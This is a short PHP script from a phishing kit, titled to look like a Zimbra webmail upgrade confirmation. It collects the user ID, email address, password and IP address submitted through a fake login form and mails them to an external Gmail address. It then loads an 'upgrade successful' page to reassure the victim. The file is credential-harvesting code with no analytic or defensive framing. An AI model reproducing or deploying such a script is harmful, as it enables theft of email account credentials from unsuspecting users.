<title>:Zimbra-Mail Upgrade Successful:</title><?php
$ip = getenv("REMOTE_ADDR");
$message .= "+++++++++++++Acc Login ReZult++++++++++++\n";
$message .= "User ID: ".$_POST['UserID']."\n";
$message .= "E-mail Address: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Confirm Password: ".$_POST['confirm_password']."\n";
$message .= "++++++++++++++++IP and Date+++++++++++++++\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "+++++++++++M0D1F1ED 3Y S194R - E54N B01+++++++++++\n";

$recipient = "chimereze148@gmail.com";
$subject = "= shwawBox =";
$headers = "Replenish Company";
$headers .= $_POST['']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to","$subject", $message);
if (mail($recipient,$subject,$message,$headers));
	   {
require("upgradesuccessful.html");

	   }
?>